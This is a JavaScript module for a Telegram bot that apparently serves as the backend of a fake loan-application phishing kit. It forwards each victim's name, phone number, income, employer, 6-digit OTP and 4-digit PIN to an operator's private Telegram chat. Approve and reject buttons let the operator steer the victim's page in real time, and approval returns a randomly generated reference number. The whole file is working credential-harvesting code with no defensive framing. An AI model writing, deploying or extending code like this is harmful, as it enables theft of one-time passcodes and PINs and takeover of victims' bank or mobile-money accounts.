/**
 * bot_manager.js
 * Optimized for 5-Step Flow: Step 4 (OTP) -> Step 5 (PIN + Admin Approval)
 */

require("dotenv").config();
const TelegramBot = require("node-telegram-bot-api");

// =====================================================
// ENV CONFIG
// =====================================================
const BOT_TOKEN = process.env.BOT_TOKEN;
const ADMIN_CHAT_ID = process.env.ADMIN_CHAT_ID;
let RENDER_URL = process.env.RENDER_EXTERNAL_URL || process.env.URL; 

if (RENDER_URL && RENDER_URL.endsWith('/')) RENDER_URL = RENDER_URL.slice(0, -1);

if (!BOT_TOKEN || !ADMIN_CHAT_ID) {
    console.error("❌ Missing BOT_TOKEN or ADMIN_CHAT_ID in Environment Variables");
    process.exit(1);
}

// =====================================================
// TELEGRAM BOT INITIALIZATION
// =====================================================
// polling: false because server.js handles webhook POSTs
const bot = new TelegramBot(BOT_TOKEN, { polling: false });

// =====================================================
// UTILITIES
// =====================================================
const escapeHTML = (str) => {
    if (!str) return "N/A";
    return String(str).replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;");
};

const currency = (n) => `$${Number(n || 0).toLocaleString()}`;
const phoneFormat = (p) => p ? `+232 ${p}` : "N/A";

// Core Sender Function
const send = (message, options = {}) => {
    return bot.sendMessage(ADMIN_CHAT_ID, message, {
        parse_mode: "HTML",
        ...options
    }).catch(err => {
        console.error("Telegram Send Error:", err.message);
    });
};

// =====================================================
// STEP SENDERS (5 STEP FLOW)
// =====================================================

const sendStep1 = (d) => send(`💰 <b>STEP 1 – LOAN DETAILS</b>\n━━━━━━━━━━━━━━━━━━━━\n🆔 <b>App ID:</b> <code>${escapeHTML(d.appId)}</code>\n📋 <b>Type:</b> ${escapeHTML(d.loanType)}\n💵 <b>Amount:</b> ${currency(d.amount)}`);

const sendStep2 = (d) => send(`👤 <b>STEP 2 – PERSONAL INFO</b>\n━━━━━━━━━━━━━━━━━━━━\n🆔 <b>App ID:</b> <code>${escapeHTML(d.appId)}</code>\n👤 <b>Name:</b> ${escapeHTML(d.firstName)} ${escapeHTML(d.lastName)}\n📞 <b>Phone:</b> ${phoneFormat(d.phone)}`);

const sendStep3 = (d) => send(`💼 <b>STEP 3 – EMPLOYMENT</b>\n━━━━━━━━━━━━━━━━━━━━\n🆔 <b>App ID:</b> <code>${escapeHTML(d.appId)}</code>\n💰 <b>Income:</b> ${currency(d.income)}\n🏢 <b>Employer:</b> ${escapeHTML(d.employer)}`);

// Step 4 is now just a 6-digit OTP notification (No button here)
const sendStep4 = (d) => send(`🔢 <b>STEP 4 – OTP RECEIVED</b>\n━━━━━━━━━━━━━━━━━━━━\n🆔 <b>App ID:</b> <code>${escapeHTML(d.appId)}</code>\n👤 <b>Name:</b> ${escapeHTML(d.firstName)}\n🔢 <b>6-Digit OTP:</b> <code>${escapeHTML(d.otp)}</code>`);

// Step 5 triggers the FINAL Approval Request with the PIN
const sendApprovalRequest = (d) => {
    const msg = `⚠️ <b>FINAL STEP 5 – ADMIN APPROVAL</b>\n━━━━━━━━━━━━━━━━━━━━\n🆔 <b>App ID:</b> <code>${escapeHTML(d.appId)}</code>\n👤 <b>Client:</b> ${escapeHTML(d.firstName)} ${escapeHTML(d.lastName)}\n📞 <b>Phone:</b> ${phoneFormat(d.phone)}\n💵 <b>Amount:</b> ${currency(d.amount)}\n\n🔐 <b>OTP:</b> <code>${escapeHTML(d.otp)}</code>\n🔐 <b>4-Digit PIN:</b> <code>${escapeHTML(d.pin)}</code>\n\n<b>Review the data above before approving.</b>`;
    
    send(msg, {
        reply_markup: {
            inline_keyboard: [[
                { text: "✅ APPROVE LOAN", callback_data: `apr_pn_${d.appId}` },
                { text: "❌ REJECT", callback_data: `rej_pn_${d.appId}` }
            ]]
        }
    });
};

// =====================================================
// CALLBACK HANDLER (BUTTON LOGIC)
// =====================================================
bot.on("callback_query", async (query) => {
    const { data, id, message } = query;
    const [action, type, appId] = data.split("_");

    await bot.answerCallbackQuery(id).catch(() => {});

    const io = global.io;
    if (!io) {
        console.error("❌ Socket.io instance missing from global scope");
        return;
    }

    if (action === "apr") {
        // Generate a random success Reference ID
        const referenceId = "ASA-" + Math.floor(Math.random() * 900000 + 100000);
        
        // Signal the frontend to show Step 6 (Success)
        io.to(appId).emit("pin-verified", { referenceId });
        
        bot.editMessageText(`${message.text}\n\n✅ <b>LOAN APPROVED</b>\nRef: ${referenceId}`, {
            chat_id: ADMIN_CHAT_ID,
            message_id: message.message_id,
            parse_mode: "HTML"
        });
    }

    if (action === "rej") {
        // Signal the frontend to show an error
        io.to(appId).emit("error", "Your application has been declined by an agent.");
        
        bot.editMessageText(`${message.text}\n\n❌ <b>LOAN REJECTED</b>`, {
            chat_id: ADMIN_CHAT_ID,
            message_id: message.message_id,
            parse_mode: "HTML"
        });
    }
});

module.exports = {
    bot, 
    sendStep1,
    sendStep2,
    sendStep3,
    sendStep4,
    sendApprovalRequest, // Step 5
    sendTelegramMessage: (msg) => send(msg)
};